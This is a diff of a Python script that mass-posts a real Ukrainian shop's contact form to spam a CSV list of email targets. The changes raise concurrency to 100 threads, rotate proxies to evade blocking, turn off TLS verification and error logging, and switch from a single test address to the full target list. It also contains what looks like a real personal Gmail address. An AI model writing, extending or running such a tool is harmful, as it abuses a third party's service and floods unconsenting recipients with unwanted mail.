@@ -8,11 +8,11 @@ from faker import Faker
 from requests.exceptions import ConnectTimeout, ProxyError
 from requests.models import Response
 
-from data import get_targets, get_proxies, generate_proxy, text_body, logger
+from data import get_targets, get_proxies, generate_proxy, text_body, logger, get_proxies_from_json, target_generator
 
 URL = 'https://aromakava.ua/api/form/2'
-all_proxies = get_proxies(r'C:\Users\Admin\Desktop\projects\west_proxy.txt')
-proxy_generator = generate_proxy(all_proxies)
+# all_proxies = get_proxies(r'C:\Users\Admin\Desktop\projects\west_proxy.txt')
+proxy_generator = generate_proxy(get_proxies_from_json())
 
 
 def post(email: str, proxy: Optional[str] = None) -> Response:
@@ -39,21 +39,17 @@ def post(email: str, proxy: Optional[str] = None) -> Response:
         'vashe-povidomlennya': text_body
     }
     resp = requests.post(URL, headers=headers, data=body, proxies={'http': proxy, 'https': proxy},
-                         verify=False, timeout=10)
+                         verify=False, timeout=5)
     return resp
 
 
 def try_to_post(proxy, result, target):
     try:
         result = post(email=target, proxy=proxy)
-    except ConnectTimeout as e:
-        # logger.error(e)
-        pass
-    except ProxyError as e:
-        logger.error(e)
+    except ProxyError:
         sleep(20)
-    except Exception as e:
-        logger.error(e)
+    except Exception:
+        pass
     return result
 
 
@@ -64,24 +60,24 @@ def spam(target):
     while result is None:
         proxy = next(proxy_generator)
         result = try_to_post(proxy, result, target)
-    return result.json(), result.status_code, target
+    return result, result.status_code, target
 
 
 def main():
-    with ThreadPoolExecutor(max_workers=75) as worker:
+    with ThreadPoolExecutor(max_workers=100) as worker:
         futures = []
-        for target in get_targets(r'C:\Users\Admin\Desktop\projects\all_turk.csv'):
+        for target in target_generator(r'C:\Users\Admin\Desktop\projects\all_turk.csv'):
             future = worker.submit(spam, target)
             futures.append(future)
         for future in as_completed(futures):
-            future.result()
+            print(future.result())
 
 
 def test():
     print(spam('softumwork@gmail.com'))
-    # for target in get_targets():
-    #     spam(target)
+    for target in target_generator():
+        print(spam(target))
 
 
 if __name__ == '__main__':
-    test()
+    main()
